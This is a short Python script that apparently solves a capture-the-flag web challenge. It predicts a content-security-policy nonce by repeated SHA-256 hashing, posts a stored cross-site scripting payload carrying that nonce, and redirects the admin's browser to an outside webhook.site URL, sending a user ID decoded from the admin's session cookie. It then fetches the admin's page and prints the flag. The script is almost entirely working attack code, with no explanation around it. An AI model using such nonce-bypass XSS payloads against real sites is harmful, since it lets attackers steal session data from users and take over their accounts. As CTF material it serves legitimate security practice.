#!/usr/bin/python

import requests
import hashlib
import sys

# BASE_URL = 'http://localhost:3000'
BASE_URL = 'https://yolo.tjc.tf'

ATTACKER_URL = 'https://webhook.site/ff4122d5-ba66-4ec7-9854-e9550faef13a'

nonce = '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d'

for i in range(3):
    nonce = hashlib.sha256(nonce.encode('utf-8')).hexdigest()

print(nonce)

s = requests.Session()

s.get(BASE_URL)

# Get admin user ID
print(s.post(BASE_URL, data={
    'name': f"""<script nonce="{nonce}">window.location = '{ATTACKER_URL}?x=' + JSON.parse(atob(document.cookie.split('.')[1])).userId;</script>""",
    'toDo': 'idk'
}).url)

user_id = input('Enter admin ID: ').strip()

text = s.get(f'{BASE_URL}/do/{user_id}').text
print(text[text.index('tjctf{'):text.index('}', text.index('tjctf{') + 1)+1])
